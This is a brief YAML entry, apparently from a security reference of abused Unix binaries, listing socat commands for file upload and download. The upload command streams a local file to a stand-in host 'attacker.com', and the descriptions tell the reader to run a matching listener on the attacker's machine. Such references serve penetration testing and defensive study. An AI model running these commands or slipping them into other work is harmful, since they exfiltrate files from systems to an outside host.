---
functions:
  file-upload:
    - description: Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
  file-download:
    - description: Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_save
        socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
---
